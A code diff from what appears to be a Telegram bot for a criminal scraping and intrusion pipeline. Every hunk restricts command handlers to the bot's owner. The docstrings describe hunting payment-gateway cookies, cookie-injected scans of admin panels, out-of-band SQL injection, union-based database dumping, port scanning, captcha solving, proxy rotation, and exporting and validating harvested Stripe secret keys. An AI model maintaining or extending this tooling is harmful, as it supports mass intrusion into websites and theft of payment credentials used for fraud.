@@ -4399,7 +4399,7 @@ async def cmd_dorkoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /status command — live dashboard."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     stats = p.get_stats()
 
@@ -4528,7 +4528,7 @@ async def cmd_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_cookiehunt(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /cookiehunt <url> command — actively hunt a URL for B3 + gateway cookies."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
 
     if not p.cookie_hunter:
@@ -4754,7 +4754,7 @@ async def cmd_dumps(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_categories(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /categories command."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     text = (
         "🎯 <b>Available Categories</b>\n"
         "\n"
@@ -6139,7 +6139,7 @@ async def cmd_authscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     Uses Playwright (JS rendering) + cookie injection to access
     authenticated dashboards, admin panels, API endpoints.
     """
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     if not context.args or len(context.args) < 2:
         await update.message.reply_text(
             "<b>🔐 Authenticated Scan</b>\n\n"
@@ -6643,7 +6643,7 @@ async def cmd_export(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_firecrawl(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show Firecrawl status and usage."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
 
     if not p.config.firecrawl_enabled or not p.config.firecrawl_api_key:
@@ -6679,7 +6679,7 @@ async def cmd_firecrawl(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show captcha solver status, balances, and stats."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
 
     if not p.captcha_solver or not p.captcha_solver.available:
@@ -6744,7 +6744,7 @@ async def cmd_captcha(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /proxy command — show proxy pool status and stats."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
 
     if not p.proxy_manager or not p.proxy_manager.has_proxies:
@@ -6813,7 +6813,7 @@ async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_browser(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /browser command — show headless browser engine stats."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
 
     if not p.browser_manager:
@@ -6851,7 +6851,7 @@ async def cmd_browser(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_ecom(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /ecom command — show e-commerce checker stats."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     if not p.ecom_checker:
         await update.message.reply_text(
@@ -6864,7 +6864,7 @@ async def cmd_ecom(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_crawlstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /crawlstats command — show recursive crawler stats."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     if not p.crawler:
         await update.message.reply_text(
@@ -6888,7 +6888,7 @@ async def cmd_crawlstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_ports(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /ports command — show port scanner stats."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     if not p.port_scanner:
         await update.message.reply_text(
@@ -6901,7 +6901,7 @@ async def cmd_ports(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_oob(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /oob command — show OOB SQLi injector stats."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     if not p.oob_injector:
         await update.message.reply_text(
@@ -6916,7 +6916,7 @@ async def cmd_oob(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_unionstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /unionstats command — show multi-DBMS union dumper stats."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     if not p.union_dumper:
         await update.message.reply_text(
@@ -6929,7 +6929,7 @@ async def cmd_unionstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /keys command — export all Stripe keys as .txt file attachment."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     if not p.key_validator:
         await update.message.reply_text("❌ API key validator is not enabled.")
@@ -7006,7 +7006,7 @@ async def cmd_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_mlfilter(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /mlfilter command — show ML false positive filter stats."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     if not p.ml_filter:
         await update.message.reply_text(
@@ -7061,7 +7061,7 @@ async def cmd_skip(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_stores(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /stores command — export Shopify stores as .txt file attachment."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     stores = p.db.get_shopify_stores(limit=500)
 
@@ -7114,7 +7114,7 @@ async def cmd_stores(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_del(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /del command — delete an export file from the server."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     import re
 
     args = context.args
@@ -7190,7 +7190,7 @@ async def cmd_del(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_skvalidate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /skvalidate command — on-demand validation of a Stripe SK key."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     if not p.key_validator:
         await update.message.reply_text("❌ Key validator is not enabled.")
@@ -7249,7 +7249,7 @@ async def cmd_skvalidate(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_checkkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /checkkey command — validate ANY API key (auto-detects type)."""
-    if not await require_auth(update): return
+    if not await require_owner(update): return
     p = get_pipeline()
     if not p.key_validator:
         await update.message.reply_text("❌ Key validator is not enabled.")
